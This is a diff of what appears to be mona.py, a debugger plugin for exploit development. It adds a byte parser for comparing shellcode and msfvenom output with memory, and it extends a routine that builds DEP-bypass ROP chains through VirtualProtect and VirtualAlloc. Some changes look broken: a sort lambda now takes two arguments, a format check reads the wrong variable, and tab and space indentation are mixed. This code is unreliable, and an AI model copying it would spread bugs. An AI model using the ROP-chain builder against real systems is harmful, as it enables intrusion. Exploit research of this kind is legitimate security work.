+# 			btcnt = 0
+# 			cnt = 0
+# 			linecount = 0
+# 			hexstr = ""
+# 			hexbytes = ""
+# 			for eachByte in srcdata:
+# 				if cnt < 8:
+# 					hexbytes += eachByte
+# 					if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
+# 						hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
+# 					else:
+# 						hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
+# 					hexstr += hexchar					
+# 				cnt += 1
+# 			dbg.log("    - searching for "+hexstr)
+# 			global silent
+# 			silent = True
+# 			results = findPattern({},criteria,hexstr,"bin",0,TOP_USERLAND,False)
 
-            for type in results:
-                for ptr in results[type]:
-                    ptrinfo = MnPointer(ptr).memLocation()
-                    if not skipmodules or (skipmodules and (ptrinfo in ["Heap","Stack","??"])):
-                        locations.append(ptr)
-            if len(locations) == 0:
-                dbg.log("      Oops, no copies found")
-        else:
-            startpos_fixed = startpos
-            locations.append(startpos_fixed)
-        if len(locations) > 0:
-            dbg.log("    - Comparing %d location(s)" % (len(locations)))
-            dbg.log("Comparing bytes from file with memory :")
-            for location in locations:
-                memcompare(location,srcdata,comparetable,mode, smart=(mode == 'normal'))
-        silent = False
-    return
+# 			for type in results:
+# 				for ptr in results[type]:
+# 					ptrinfo = MnPointer(ptr).memLocation()
+# 					if not skipmodules or (skipmodules and (ptrinfo in ["Heap","Stack","??"])):
+# 						locations.append(ptr)
+# 			if len(locations) == 0:
+# 				dbg.log("      Oops, no copies found")
+# 		else:
+# 			startpos_fixed = startpos
+# 			locations.append(startpos_fixed)
+# 		if len(locations) > 0:
+# 			dbg.log("    - Comparing %d location(s)" % (len(locations)))
+# 			dbg.log("Comparing bytes from file with memory :")
+# 			for location in locations:
+# 				memcompare(location,srcdata,comparetable,mode, smart=(mode == 'normal'))
+# 		silent = False
+# 	return
+
+def compareFormattedFileWithMemory(filename,format,startpos,skipmodules=False,findunicode=False):
+
+	isDebug=False
+
+	def out(x): 
+		dbg.log(x)
+			
+	def ok(x): dbg.log("[+] " + x) 
+	def verbose(x):
+		if isDebug:
+			dbg.log("[dbg] " + x)
+
+	def warn(x): dbg.log("[?] " + x, highlight=1)
+	def err(x): dbg.log(x, highlight=1)
+
+	#Class ported from https://github.com/mgeeky/expdevBadChars, author: mgeeky, Mariusz B.
+	#Ported by: onlylonly, Z.Y Liew
+	class BytesParser():
+		formats_rex = {
+			'xxd': r'^[^0-9a-f]*[0-9a-f]{2,}\:\s((?:[0-9a-f]{4}\s)+)\s+.+$',
+			'hexdump': r'^[^0-9a-f]*[0-9a-f]{2,}\s+([0-9a-f\s]+[0-9a-f])$',
+			'classic-hexdump':r'^[0-9a-f]*[0-9a-f]{2,}(?:\:|\s)+\s([0-9a-f\s]+)\s{2,}.+$',
+			'hexdump-C': r'^[0-9a-f]*[0-9a-f]{2,}\s+\s([0-9a-f\s]+)\s*\|', 
+			'escaped-hexes': r'^[^\'"]*((?:\'[\\\\x0-9a-f]{8,}\')|(?:"[\\\\x0-9a-f]{8,}"))',
+			'hexstring': r'^([0-9a-f]+)$',
+			'msfvenom-powershell': r'^[^0x]+((?:0x[0-9a-f]{1,2},?)+)$',
+			'byte-array': r'^[^0x]*((?:0x[0-9a-f]{2}(?:,\s?))+)',
+			'js-unicode': r'^[^%u0-9a-f]*((?:%u[0-9a-f]{4})+)$',
+			'dword': r'^(?:((?:0x[0-9a-f]{1,8}\s[<>\w\+]+)|(?:0x[0-9a-f]{1,8})):\s*)?((?:0x[0-9a-f]{8},?\s*)+)$',
+		}
+		formats_aliases = {
+			'classic-hexdump': ['ollydbg'],
+			'escaped-hexes': ['msfvenom-ruby','msfvenom-c', 'msfvenom-carray', 'msfvenom-python'],
+			'dword': ['gdb']
+		}
+		formats_compiled = {}
+
+		def __init__(self, input, name = None, format = None):
+			#convert list to string
+			self.input = ''.join(input)
+			self.name = name
+			self.bytes = []
+			self.parsed = False
+			self.format = None
+
+			BytesParser.compile_regexps()
+
+
+			if format:
+				verbose("Using user-specified format: %s" % format)
+	
+				try:
+					self.format = BytesParser.interpret_format_name(format)
+				except Exception as e:
+					verbose(str(e))
+
+				#exit when user-specified format not in both formats_rex and formats_aliases 
+				assert (format in BytesParser.formats_rex.keys() or self.format is not None), \
+						"Format '%s' is not implemented." % format
+						
+				if self.format is None:
+					self.format = format
+
+			else:
+				self.recognize_format()
+
+			#do not normalize input on raw format to prevent input tempering
+			if str(self.format).lower() != "raw":
+				self.normalize_input()
+
+			if not self.format:
+				self.parsed = False
+			else:
+				if self.fetch_bytes():
+					ok("Fetched %d bytes successfully from %s" % (len(self.bytes), self.name))
+					self.parsed = True
+				else:
+					if format and len(format):
+						err("Could not parse %s with user-specified format: %s" % (self.name, format))
+					else:
+						err("Recognized input %s as formatted with %s but failed fetching bytes." %
+							(self.name, self.format))
+
+		def normalize_input(self):
+			input = []
+			for line in self.input.split('\n'):
+				line = line.strip()
+				line2 = line.encode('string-escape')
+				input.append(line2)
+			self.input = '\n'.join(input)
+
+		@staticmethod
+		def interpret_format_name(name):
+			if str(format).lower() == "raw":
+				return "raw"
+
+			for k, v in BytesParser.formats_aliases.items():
+				if name.lower() in v:
+					return k
+			raise Exception("Format name: %s not recognized as alias." % name)
+
+		@staticmethod
+		def compile_regexps():
+			if len(BytesParser.formats_compiled) == 0:
+				for name, rex in BytesParser.formats_rex.items():
+					BytesParser.formats_compiled[name] = re.compile(rex, re.I)
+
+		@staticmethod
+		def make_line_printable(line):
+			return ''.join([c if c in string.printable else '.' for c in line])
+
+		def recognize_format(self):
+			for line in self.input.split('\n'):
+				if self.format: break
+				for format, rex in BytesParser.formats_compiled.items():
+					line = BytesParser.make_line_printable(line)
+
+					verbose("Trying format %s on ('%s')" % (format, line))
+					
+					if rex.match(line):
+						ok("%s has been recognized as %s formatted." % (self.name, format))
+						self.format = format
+						break
+
+			if not self.format:
+				if not all(c in string.printable for c in self.input):
+					ok("%s has been recognized as RAW bytes." % (self.name))
+					self.format = 'raw'
+					return True
+				else:
+					err("Could not recognize input bytes format of the %s!" % self.name)
+					return False
+
+
+			return (len(self.format) > 0)
+
+		@staticmethod
+		def post_process_bytes_line(line):
+			outb = []
+			l = line.strip()[:]
+			strip = ['0x', ',', ' ', '\\', 'x', '%u', '+', '.', "'", '"']
+			for s in strip:
+				l = l.replace(s, '')
+
+			for i in xrange(0, len(l), 2):
+				outb.append(int(l[i:i+2], 16))
+			return outb
+
+		@staticmethod
+		def preprocess_bytes_line(line):
+			l = line.strip()[:]
+			strip = ['(byte)', '+', '.']
+			for s in strip:
+				l = l.replace(s, '')
+			return l
+
+		@staticmethod
+		def unpack_dword(line):
+			outs = ''
+			i = 0
+
+			for m in re.finditer(r'((?:0x[0-9a-f]{8}(?!:),?\s*))', line):
+				l = m.group(0)
+				l = l.replace(',', '')
+				l = l.replace(' ', '')
+				dword = int(l, 16)
+				unpack = reversed([
+					(dword & 0xff000000) >> 24,
+					(dword & 0x00ff0000) >> 16,
+					(dword & 0x0000ff00) >>  8,
+					(dword & 0x000000ff)
+				])
+				i += 4
+				for b in unpack:
+					outs += '%02x' % b
+
+			verbose("After callback ('%s')" % outs)
+			return BytesParser.formats_compiled['hexstring'].match(outs)
+
+		def fetch_bytes(self):
+			if not self.format:
+				err("fetch_bytes(): Format has not been specified!")
+				return False
+
+			if self.format == 'raw':
+				verbose("Parsing %s as raw bytes." % self.name)
+				self.bytes = [ord(c) for c in list(self.input)]
+				return len(self.bytes) > 0
+			
+			for line in self.input.split('\n'):
+				callback_called = False
+				if self.format in BytesParser.formats_callbacks.keys() and \
+						BytesParser.formats_callbacks[self.format]:
+					verbose("Before callback ('%s')" % line)
+					m = BytesParser.formats_callbacks[self.format].__func__(line)
+					callback_called = True
+				else:
+					line = BytesParser.preprocess_bytes_line(line[:])
+					m = BytesParser.formats_compiled[self.format].match(line)
+
+				if m:
+					extract = ''
+					for mg in m.groups()[0:]:
+						if len(mg) > 0:
+							extract = mg
+					bytes = BytesParser.post_process_bytes_line(extract)
+					if not bytes:
+						err("Could not process %s bytes line ('%s') as %s formatted! Quitting." \
+								% (self.name, line, self.format))
+					else:
+						verbose("Line ('%s'), bytes ('%s'), extracted ('%s'), len: %d" % (line, extract, bytes, len(bytes)))
+						self.bytes.extend(bytes)
+				else:
+					if callback_called:
+						verbose("Callback failure: transformed string ('%s') did not catched on returned match" % (line))
+					else:
+						verbose("Parsing line ('%s') failed with format '%s'." % (line, self.format))
+
+			return len(self.bytes) > 0
+
+		@staticmethod
+		def get_available_format():
+			#check is input format valid?
+			avail_formats = ['raw',]
+			avail_formats.extend(BytesParser.formats_rex.keys())
+			for k, v in BytesParser.formats_aliases.items():
+				avail_formats.extend(v)
+
+			formats = ', '.join(["'"+x+"'" for x in avail_formats]) #list all available formats
+			return formats
+
+		@staticmethod
+		def is_valid_format(format):
+			avail_formats = BytesParser.get_available_format()
+			return format in avail_formats		
+
+		def get_bytes(self):
+			return self.bytes
+
+		formats_callbacks = {
+			'dword': unpack_dword
+		}
+
+	########## END Class : BytesParser
+
+	dbg.log("[+] Reading file %s..." % filename)
+	srcdata_normal=[]
+	srcdata_unicode=[]
+	tagresults=[]
+	criteria = {}
+	criteria["accesslevel"] = "*"
+	try:
+		srcfile = open(filename,"rb")
+		content = srcfile.readlines()
+		srcfile.close()
+		for eachLine in content:
+			srcdata_normal += eachLine
+		for eachByte in srcdata_normal:
+			eachByte+=struct.pack('B', 0)
+			srcdata_unicode += eachByte
+		dbg.log("    Read %d bytes from file" % len(srcdata_normal))
+	except:
+		dbg.log("Error while reading file %s" % filename, highlight=1)
+		return
+	# loop normal and unicode
+	comparetable=dbg.createTable('mona Memory comparison results',['Address','Status','BadChars','Type','Location'])	
+	modes = ["normal", "unicode"]
+	if not findunicode:
+		modes.remove("unicode")
+	objlogfile = MnLog("compare.txt")
+	logfile = objlogfile.reset()
+	for mode in modes:
+		if mode == "normal":
+			srcdata = srcdata_normal
+		if mode == "unicode":
+			srcdata = srcdata_unicode
+
+		#check is user supplied input is valid input
+		if format and not BytesParser.is_valid_format(format):
+			err("Format that was specified is not recognized.")
+			err("Valid formats: %s" % BytesParser.get_available_format())		
+
+		#parse input file
+		b = BytesParser(srcdata, filename, format)
+		if not b.parsed:
+			return False
+		else:
+			srcdata = b.get_bytes()
+
+		#convert bytes array(from BytesParser) to string array
+		#mona expect input as string array 
+		bytetostr = []
+		for eachByte in srcdata:
+			bytetostr += chr(eachByte)
+		srcdata = bytetostr
+		
+		maxcnt = len(srcdata)
+		if maxcnt < 8:
+			dbg.log("Error - file does not contain enough bytes (min 8 bytes needed)",highlight=1)
+			return
+		locations = []
+		if startpos == 0:
+			dbg.log("[+] Locating all copies in memory (%s)" % mode)
+			btcnt = 0
+			cnt = 0
+			linecount = 0
+			hexstr = ""
+			hexbytes = ""
+			for eachByte in srcdata:
+				if cnt < 8:
+					hexbytes += eachByte
+					if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
+						hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
+					else:
+						hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
+					hexstr += hexchar					
+				cnt += 1
+			dbg.log("    - searching for "+hexstr)
+			global silent
+			silent = True
+			results = findPattern({},criteria,hexstr,"bin",0,TOP_USERLAND,False)
+
+			for _type in results:
+				for ptr in results[_type]:
+					ptrinfo = MnPointer(ptr).memLocation()
+					if not skipmodules or (skipmodules and (ptrinfo in ["Heap","Stack","??"])):
+						locations.append(ptr)
+			if len(locations) == 0:
+				dbg.log("      Oops, no copies found")
+		else:
+			startpos_fixed = startpos
+			locations.append(startpos_fixed)
+		if len(locations) > 0:
+			dbg.log("    - Comparing %d location(s)" % (len(locations)))
+			dbg.log("Comparing bytes from file with memory :")
+			for location in locations:
+				memcompare(location,srcdata,comparetable,mode, smart=(mode == 'normal'))
+		silent = False
+	return
+
 
 def memoized(func):
     ''' A function decorator to make a function cache it's return values.
@@ -8011,9 +8474,8 @@ class MemoryComparator(object):
                             mappings_by_byte[b][slc] += 1
                             slices.add(slc)
 
-        for b, values in mappings_by_byte.iteritems():
-            mappings_by_byte[b] = sorted(values.items(),
-                                         key=lambda (value, count): (-count, -len(value)))
+		for b, values in mappings_by_byte.iteritems():
+			mappings_by_byte[b] = sorted(values.items(), key=lambda value, count : (-count, -len(value)))
 
         for c in self.get_chunks():
             dx, dy, xchunk, ychunk = c.dx, c.dy, c.xchunk, c.ychunk
@@ -8195,17 +8657,17 @@ def memcompare(location, src, comparetable, sctype, smart=True, tablecols=16):
 # ROP related functions
 #-----------------------------------------------------------------------#
 
-def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,criteria,objprogressfile,progressfile):
-    """
-    Will attempt to produce ROP chains
-    """
-    
-    global ptr_to_get
-    global ptr_counter
-    global silent
-    global noheader
-    global ignoremodules
-    
+def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,criteria,objprogressfile,progressfile,technique):
+	"""
+	Will attempt to produce ROP chains
+	"""
+	
+	global ptr_to_get
+	global ptr_counter
+	global silent
+	global noheader
+	global ignoremodules
+	
 
     #vars
     vplogtxt = ""
@@ -8215,26 +8677,26 @@ def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,cri
     if "rva" in criteria:
         showrva = True
 
-    #define rop routines
-    routinedefs = {}
-    routinesetup = {}
-    
-    virtualprotect              = [["esi","api"],["ebp","jmp esp"],["ebx",0x201],["edx",0x40],["ecx","&?W"],["edi","ropnop"],["eax","nop"]]
-    virtualalloc                = [["esi","api"],["ebp","jmp esp"],["ebx",0x01],["edx",0x1000],["ecx",0x40],["edi","ropnop"],["eax","nop"]]
-    setinformationprocess       = [["ebp","api"],["edx",0x22],["ecx","&","0x00000002"],["ebx",0xffffffff],["eax",0x4],["edi","pop"]] 
-    setprocessdeppolicy         = [["ebp","api"],["ebx","&","0x00000000"],["edi","pop"]]
-    
-    routinedefs["VirtualProtect"]           = virtualprotect
-    routinedefs["VirtualAlloc"]             = virtualalloc
-    # only run these on older systems
-    osver=dbg.getOsVersion()
-    if not (osver == "6" or osver == "7" or osver == "8" or osver == "vista" or osver == "win7" or osver == "2008server" or osver == "win8"):
-        routinedefs["SetInformationProcess"]    = setinformationprocess
-        routinedefs["SetProcessDEPPolicy"]      = setprocessdeppolicy   
-    
-    modulestosearch = getModulesToQuery(modulecriteria)
-    
-    routinesetup["VirtualProtect"] = """--------------------------------------------
+	#define rop routines
+	routinedefs = {}
+	routinesetup = {}
+	
+	virtualprotect 				= [["esi","api"],["ebp","jmp esp"],["ebx",0x201],["edx",0x40],["ecx","&?W"],["edi","ropnop"],["eax","nop"]]
+	virtualalloc				= [["esi","api"],["ebp","jmp esp"],["ebx",0x01],["edx",0x1000],["ecx",0x40],["edi","ropnop"],["eax","nop"]]
+	setinformationprocess		= [["ebp","api"],["edx",0x22],["ecx","&","0x00000002"],["ebx",0xffffffff],["eax",0x4],["edi","pop"]] 
+	setprocessdeppolicy			= [["ebp","api"],["ebx","&","0x00000000"],["edi","pop"]]
+	
+	routinedefs["VirtualProtect"] 			= virtualprotect
+	routinedefs["VirtualAlloc"] 			= virtualalloc
+	# only run these on older systems
+	osver=dbg.getOsVersion()
+	if not (osver == "6" or osver == "7" or osver == "8" or osver == "vista" or osver == "win7" or osver == "2008server" or osver == "win8" or osver == "win8.1" or osver == "win10"):
+		routinedefs["SetInformationProcess"]	= setinformationprocess
+		routinedefs["SetProcessDEPPolicy"]		= setprocessdeppolicy	
+	
+	modulestosearch = getModulesToQuery(modulecriteria)
+	
+	routinesetup["VirtualProtect"] = """--------------------------------------------
  EAX = NOP (0x90909090)
  ECX = lpOldProtect (ptr to W address)
  EDX = NewProtect (0x40)
@@ -8299,7 +8761,15 @@ def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,cri
  EDI = ROP NOP (4 byte stackpivot)
 --------------------------------------------"""
 
-    updatetxt = ""
+	updatetxt = ""
+    
+	# restrict techniques if needed
+	validatedroutinedefs = {}
+	if technique != "":
+		for routine in routinedefs:
+			if technique.lower() == routine.lower():
+				validatedroutinedefs[routine] = routinedefs[routine]            
+		routinedefs = validatedroutinedefs
 
     for routine in routinedefs:
     
@@ -8347,521 +8817,552 @@ def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,cri
             dbg.log("    %s: Step %d/%d: %s" % (thistimestamp,stepcnt,len(routinedefs[routine]),thisreg))
             stepcnt += 1
 
-            if not thisreg in skiplist:
-            
-                regsequences.append(thisreg)
-                
-                # this must be done first, so we can determine deviations to the chain using
-                # replacelist and skiplist arrays
-                if str(thistarget) == "api":
-                    objprogressfile.write("  * Enumerating ROPFunc info",progressfile)
-                    #dbg.log("    Enumerating ROPFunc info")
-                    # routine to put api pointer in thisreg
-                    funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat")
-                    if routine == "SetProcessDEPPolicy" and funcptr == 0:
-                        # read EAT
-                        funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"eat")
-                        extra = ""
-                        if funcptr == 0:
-                            extra = "[-] Unable to find ptr to "
-                            thischain[thisreg] = [[0,extra + routine + "() (-> to be put in " + thisreg + ")",0]]
-                        else:
-                            thischain[thisreg] = putValueInReg(thisreg,funcptr,routine + "() [" + MnPointer(funcptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
-                    else:
-                        objprogressfile.write("    Function pointer : 0x%0x",funcptr)
-                        objprogressfile.write("  * Getting pickup gadget",progressfile)
-                        thischain[thisreg],skiplist = getPickupGadget(thisreg,funcptr,functext,suggestions,interestinggadgets,criteria,modulecriteria,routine)
-                        # if skiplist is not empty, then we are using the alternative pickup (via jmp [eax])
-                        # this means we have to make some changes to the routine
-                        # and place this pickup at the end
-                        
-                        if len(skiplist) > 0:
-                            if routine.lower() == "virtualprotect" or routine.lower() == "virtualalloc":
-                                replacelist["ebp"] = "pop"
+			if not thisreg in skiplist:
+			
+				regsequences.append(thisreg)
+				
+				# this must be done first, so we can determine deviations to the chain using
+				# replacelist and skiplist arrays
+				if str(thistarget) == "api":
+					objprogressfile.write("  * Enumerating ROPFunc info (IAT Query)",progressfile)
+					#dbg.log("    Enumerating ROPFunc info")
+					# routine to put api pointer in thisreg
+					funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat", objprogressfile, progressfile)
+					if routine == "SetProcessDEPPolicy" and funcptr == 0:
+						# read EAT
+						funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"eat", objprogressfile, progressfile)
+						extra = ""
+						if funcptr == 0:
+							extra = "[-] Unable to find ptr to "
+							thischain[thisreg] = [[0,extra + routine + "() (-> to be put in " + thisreg + ")",0]]
+						else:
+							thischain[thisreg] = putValueInReg(thisreg,funcptr,routine + "() [" + MnPointer(funcptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
+					else:
+						objprogressfile.write("    Function pointer : 0x%0x" % funcptr, progressfile)
+						objprogressfile.write("  * Getting pickup gadget",progressfile)
+						thischain[thisreg],skiplist = getPickupGadget(thisreg,funcptr,functext,suggestions,interestinggadgets,criteria,modulecriteria,routine)
+						# if skiplist is not empty, then we are using the alternative pickup (via jmp [eax])
+						# this means we have to make some changes to the routine
+						# and place this pickup at the end
+						
+						if len(skiplist) > 0:
+							if routine.lower() == "virtualprotect" or routine.lower() == "virtualalloc":
+								replacelist["ebp"] = "pop"
 
-                                #set up call to finding jmp esp
-                                oldsilent = silent
-                                silent=True
-                                ptr_counter = 0
-                                ptr_to_get = 3
-                                jmpreg = findJMP(modulecriteria,criteria,"esp")
-                                ptr_counter = 0
-                                ptr_to_get = -1
-                                jmpptr = 0
-                                jmptype = ""
-                                silent=oldsilent
-                                total = getNrOfDictElements(jmpreg)
-                                if total > 0:
-                                    ptrindex = random.randint(1,total)
-                                    indexcnt= 1
-                                    for regtype in jmpreg:
-                                        for ptr in jmpreg[regtype]:
-                                            if indexcnt == ptrindex:
-                                                jmpptr = ptr
-                                                jmptype = regtype
-                                                break
-                                            indexcnt += 1
-                                if jmpptr > 0:
-                                    toadd[thistarget] = [jmpptr,"ptr to '" + jmptype + "'"]
-                                else:
-                                    toadd[thistarget] = [jmpptr,"ptr to 'jmp esp'"]
-                                # make sure the pickup is placed last
-                                movetolast.append(thisreg)
-                                
-                    
-                if str(thistarget).startswith("jmp"):
-                    targetreg = str(thistarget).split(" ")[1]
-                    #set up call to finding jmp esp
-                    oldsilent = silent
-                    silent=True
-                    ptr_counter = 0
-                    ptr_to_get = 3
-                    jmpreg = findJMP(modulecriteria,criteria,targetreg)
-                    ptr_counter = 0
-                    ptr_to_get = -1
-                    jmpptr = 0
-                    jmptype = ""
-                    silent=oldsilent
-                    total = getNrOfDictElements(jmpreg)
-                    if total > 0:
-                        ptrindex = random.randint(1,total)
-                        indexcnt= 1                 
-                        for regtype in jmpreg:
-                            for ptr in jmpreg[regtype]:
-                                if indexcnt == ptrindex:
-                                    jmpptr = ptr
-                                    jmptype = regtype
-                                    break
-                                indexcnt += 1
-                    jmpinfo = ""
-                    if jmpptr == 0:
-                        jmptype = ""
-                        jmpinfo = "Unable to find ptr to 'JMP ESP'"
-                    else:
-                        jmpinfo = MnPointer(jmpptr).belongsTo() 
-                    thischain[thisreg] = putValueInReg(thisreg,jmpptr,"& " + jmptype + " [" + jmpinfo + "]",suggestions,interestinggadgets,criteria)
-                
-                
-                if str(thistarget) == "ropnop":
-                    ropptr = 0
-                    for poptype in suggestions:
-                        if poptype.startswith("pop "):
-                            for retptr in suggestions[poptype]:
-                                if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
-                                    ropptr = retptr+1
-                                    break
-                        if poptype.startswith("inc "):
-                            for retptr in suggestions[poptype]:
-                                if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
-                                    ropptr = retptr+1
-                                    break
-                        if poptype.startswith("dec "):
-                            for retptr in suggestions[poptype]:
-                                if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
-                                    ropptr = retptr+1
-                                    break
-                        if poptype.startswith("neg "):
-                            for retptr in suggestions[poptype]:
-                                if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
-                                    ropptr = retptr+2
-                                    break
-                                
-                    if ropptr == 0:
-                        for emptytype in suggestions:
-                            if emptytype.startswith("empty "):
-                                for retptr in suggestions[emptytype]:
-                                    if interestinggadgets[retptr].startswith("# XOR"):
-                                        if getOffset(interestinggadgets[retptr]) == 0:
-                                            ropptr = retptr+2
-                                        break
-                    if ropptr > 0:
-                        thischain[thisreg] = putValueInReg(thisreg,ropptr,"RETN (ROP NOP) [" + MnPointer(ropptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
-                    else:
-                        thischain[thisreg] = putValueInReg(thisreg,ropptr,"[-] Unable to find ptr to RETN (ROP NOP)",suggestions,interestinggadgets,criteria)                   
-                
-                
-                if thistarget.__class__.__name__ == "int" or thistarget.__class__.__name__ == "long":
-                    thischain[thisreg] = putValueInReg(thisreg,thistarget,"0x" + toHex(thistarget) + "-> " + thisreg,suggestions,interestinggadgets,criteria)
-                
-                
-                if str(thistarget) == "nop":
-                    thischain[thisreg] = putValueInReg(thisreg,0x90909090,"nop",suggestions,interestinggadgets,criteria)
+								#set up call to finding jmp esp
+								oldsilent = silent
+								silent=True
+								ptr_counter = 0
+								ptr_to_get = 3
+								jmpreg = findJMP(modulecriteria,criteria,"esp")
+								ptr_counter = 0
+								ptr_to_get = -1
+								jmpptr = 0
+								jmptype = ""
+								silent=oldsilent
+								total = getNrOfDictElements(jmpreg)
+								if total > 0:
+									ptrindex = random.randint(1,total)
+									indexcnt= 1
+									for regtype in jmpreg:
+										for ptr in jmpreg[regtype]:
+											if indexcnt == ptrindex:
+												jmpptr = ptr
+												jmptype = regtype
+												break
+											indexcnt += 1
+								if jmpptr > 0:
+									toadd[thistarget] = [jmpptr,"ptr to '" + jmptype + "'"]
+								else:
+									toadd[thistarget] = [jmpptr,"ptr to 'jmp esp'"]
+								# make sure the pickup is placed last
+								movetolast.append(thisreg)
+								
+					
+				if str(thistarget).startswith("jmp"):
+					targetreg = str(thistarget).split(" ")[1]
+					#set up call to finding jmp esp
+					oldsilent = silent
+					silent=True
+					ptr_counter = 0
+					ptr_to_get = 3
+					jmpreg = findJMP(modulecriteria,criteria,targetreg)
+					ptr_counter = 0
+					ptr_to_get = -1
+					jmpptr = 0
+					jmptype = ""
+					silent=oldsilent
+					total = getNrOfDictElements(jmpreg)
+					if total > 0:
+						ptrindex = random.randint(1,total)
+						indexcnt= 1					
+						for regtype in jmpreg:
+							for ptr in jmpreg[regtype]:
+								if indexcnt == ptrindex:
+									jmpptr = ptr
+									jmptype = regtype
+									break
+								indexcnt += 1
+					jmpinfo = ""
+					jmpmodinfo = ""
+					if jmpptr == 0:
+						jmptype = ""
+						jmpinfo = "Unable to find ptr to 'JMP ESP'"
+					else:
+						jmpinfo = MnPointer(jmpptr).belongsTo() 
+						tmod = MnModule(jmpinfo)
+						jmpmodinfo = getGadgetAddressInfo(jmpptr)
+					thischain[thisreg] = putValueInReg(thisreg,jmpptr,"& " + jmptype + " [" + jmpinfo + "]" + jmpmodinfo,suggestions,interestinggadgets,criteria)
+				
+				if str(thistarget) == "ropnop":
+					ropptr = 0
+					for poptype in suggestions:
+						if poptype.startswith("pop "):
+							for retptr in suggestions[poptype]:
+								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
+									ropptr = retptr+1
+									break
+						if poptype.startswith("inc "):
+							for retptr in suggestions[poptype]:
+								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
+									ropptr = retptr+1
+									break
+						if poptype.startswith("dec "):
+							for retptr in suggestions[poptype]:
+								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
+									ropptr = retptr+1
+									break
+						if poptype.startswith("neg "):
+							for retptr in suggestions[poptype]:
+								if getOffset(interestinggadgets[retptr]) == 0 and interestinggadgets[retptr].count("#") == 2:
+									ropptr = retptr+2
+									break
+								
+					if ropptr == 0:
+						for emptytype in suggestions:
+							if emptytype.startswith("empty "):
+								for retptr in suggestions[emptytype]:
+									if interestinggadgets[retptr].startswith("# XOR"):
+										if getOffset(interestinggadgets[retptr]) == 0:
+											ropptr = retptr+2
+										break
+					if ropptr > 0:
+						thismodname = MnPointer(ropptr).belongsTo()
+						tmod = MnModule(thismodname)
+						ropnopinfo = getGadgetAddressInfo(ropptr)
 
-                    
-                if str(thistarget).startswith("&?"):
-                    #pointer to
-                    rwptr = getAPointer(modulestosearch,criteria,"RW")
-                    if rwptr == 0:
-                        rwptr = getAPointer(modulestosearch,criteria,"W")
-                    if rwptr != 0:
-                        thischain[thisreg] = putValueInReg(thisreg,rwptr,"&Writable location [" + MnPointer(rwptr).belongsTo()+"]",suggestions,interestinggadgets,criteria)
-                    else:
-                        thischain[thisreg] = putValueInReg(thisreg,rwptr,"[-] Unable to find writable location",suggestions,interestinggadgets,criteria)
-                
-                
-                if str(thistarget).startswith("pop"):
-                    #get distance
-                    if "pop " + thisreg in suggestions:
-                        popptr = getShortestGadget(suggestions["pop "+thisreg])
-                        junksize = getJunk(interestinggadgets[popptr])-4
-                        thismodname = MnPointer(popptr).belongsTo()
-                        thischain[thisreg] = [[popptr,"",junksize],[popptr,"skip 4 bytes [" + thismodname + "]"]]
-                    else:
-                        thischain[thisreg] = [[0,"[-] Couldn't find a gadget to put a pointer to a stackpivot (4 bytes) into "+ thisreg,0]]
-    
-                
-                if str(thistarget)==("&"):
-                    pattern = step[2]
-                    base = 0
-                    top = TOP_USERLAND
-                    type = "ptr"
-                    al = criteria["accesslevel"]
-                    criteria["accesslevel"] = "R"
-                    ptr_counter = 0             
-                    ptr_to_get = 2
-                    oldsilent = silent
-                    silent=True             
-                    allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
-                    silent = oldsilent
-                    criteria["accesslevel"] = al
-                    if len(allpointers) > 0:
-                        theptr = 0
-                        for ptrtype in allpointers:
-                            for ptrs in allpointers[ptrtype]:
-                                theptr = ptrs
-                                break
-                        thischain[thisreg] = putValueInReg(thisreg,theptr,"&" + str(pattern) + " [" + MnPointer(theptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
-                    else:
-                        thischain[thisreg] = putValueInReg(thisreg,0,"[-] Unable to find ptr to " + str(pattern),suggestions,interestinggadgets,criteria)
-                        
-        returnoffset = 0
-        delayedfill = 0
-        junksize = 0
-        # get longest modulename
-        longestmod = 0
-        fillersize = 0
-        for step in routinedefs[routine]:
-            thisreg = step[0]
-            if thisreg in thischain:
-                for gadget in thischain[thisreg]:
-                    thismodname = sanitize_module_name(MnPointer(gadget[0]).belongsTo())
-                    if len(thismodname) > longestmod:
-                        longestmod = len(thismodname)
-        if showrva:
-            fillersize = longestmod + 8
-        else:
-            fillersize = 0
-        
-        # modify the chain order (regsequences array)
-        for reg in movetolast:
-            if reg in regsequences:
-                regsequences.remove(reg)
-                regsequences.append(reg)
-        
+						thischain[thisreg] = putValueInReg(thisreg,ropptr,"RETN (ROP NOP) [" + thismodname + "]" + ropnopinfo,suggestions,interestinggadgets,criteria)
+					else:
+						thischain[thisreg] = putValueInReg(thisreg,ropptr,"[-] Unable to find ptr to RETN (ROP NOP)",suggestions,interestinggadgets,criteria)					
+				
+				
+				if thistarget.__class__.__name__ == "int" or thistarget.__class__.__name__ == "long":
+					thischain[thisreg] = putValueInReg(thisreg,thistarget,"0x" + toHex(thistarget) + "-> " + thisreg,suggestions,interestinggadgets,criteria)
+				
+				
